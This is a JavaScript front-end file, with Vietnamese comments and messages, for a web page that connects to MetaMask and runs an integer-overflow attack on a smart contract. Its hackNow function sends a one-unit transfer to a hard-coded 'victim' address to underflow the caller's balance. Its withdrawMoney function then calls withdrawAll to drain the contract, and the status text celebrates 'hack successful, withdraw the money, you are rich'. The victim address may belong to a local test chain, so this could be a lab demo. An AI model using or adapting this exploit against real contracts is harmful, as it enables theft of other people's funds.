// overflow_app.js - Cập nhật logic rút tiền
const contractABI = [
  "function transfer(address _to, uint256 _amount) public",
  "function getBalance(address _user) public view returns (uint256)",
  "function withdrawAll() public" 
];

let provider, signer, contract;

async function connectWallet() {
    const inputAddress = document.getElementById("contractAddrInput").value.trim();
    if (!inputAddress) { alert("Vui lòng dán địa chỉ Contract!"); return; }

    if (typeof window.ethereum !== "undefined") {
        document.getElementById("status").innerText = "Đang kết nối Metamask...";
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            contract = new ethers.Contract(inputAddress, contractABI, signer);
            
            document.getElementById("status").innerText = "Đã kết nối! Sẵn sàng tấn công.";
            document.getElementById("btnHack").disabled = false;
            
            // Lấy địa chỉ ví hiện tại để hiển thị
            const address = await signer.getAddress();
            document.getElementById("userAddress").innerText = address;

            updateBalance();
        } catch (err) {
            console.error(err);
            document.getElementById("status").innerText = "Lỗi: " + err.message;
        }
    } else {
        alert("Chưa cài Metamask!");
    }
}

async function updateBalance() {
    if(!contract) return;
    try {
        const address = await signer.getAddress();
        const balance = await contract.getBalance(address);
        document.getElementById("balanceDisplay").innerText = balance.toString();
        
        // LOGIC QUAN TRỌNG: Nếu số dư khác 0 (đã hack) -> Mở khóa nút Rút tiền
        if(balance.toString() !== "0") {
            document.getElementById("balanceDisplay").style.color = "red";
            document.getElementById("status").innerText = "HACK TRÀN SỐ THÀNH CÔNG! HÃY RÚT TIỀN!"; // Dòng chữ mới
            document.getElementById("btnWithdraw").disabled = false; // <--- LỆNH MỞ KHÓA NÚT Ở ĐÂY
        } else {
            document.getElementById("balanceDisplay").style.color = "#7ee787";
        }
    } catch (err) {
        console.log("Chưa đọc được số dư");
    }
}

async function hackNow() {
    if(!contract) return;
    document.getElementById("status").innerText = "Đang hack... Hãy xác nhận trên Metamask!";
    try {
        const victim = "0x90F79bf6EB2c4f870365E785982E1f101E93b906"; 
        const tx = await contract.transfer(victim, 1);
        document.getElementById("status").innerText = "Đang chờ blockchain xác nhận...";
        await tx.wait();
        updateBalance();
    } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi Hack: " + err.message;
    }
}

async function withdrawMoney() {
    if(!contract) return;
    document.getElementById("status").innerText = "Đang rút tiền... Check ví đi!";
    try {
        const tx = await contract.withdrawAll();
        await tx.wait();
        document.getElementById("status").innerText = "ĐÃ RÚT TIỀN THÀNH CÔNG! BẠN ĐÃ GIÀU!";
        alert("Thành công! Tiền đã về ví!");
        updateBalance();
    } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi rút tiền: " + err.message;
    }
}